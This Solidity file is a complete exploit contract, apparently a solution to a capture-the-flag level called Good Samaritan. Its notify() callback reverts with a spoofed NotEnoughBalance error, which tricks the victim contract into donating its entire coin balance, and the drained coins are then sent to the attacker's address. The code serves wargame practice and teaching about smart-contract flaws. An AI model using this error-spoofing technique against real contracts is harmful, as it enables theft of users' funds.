// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./GoodSamaritan.sol";

contract AttackGoodSamaritan is INotifyable {
    GoodSamaritan immutable victim;
    address owner;

    error NotEnoughBalance();

    constructor(GoodSamaritan _victim) {
        victim = _victim;
        owner = msg.sender;
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function attack() external {
        victim.requestDonation();

        uint256 amount = victim.coin().balances(address(this));
        victim.coin().transfer(owner, amount);
    }
}
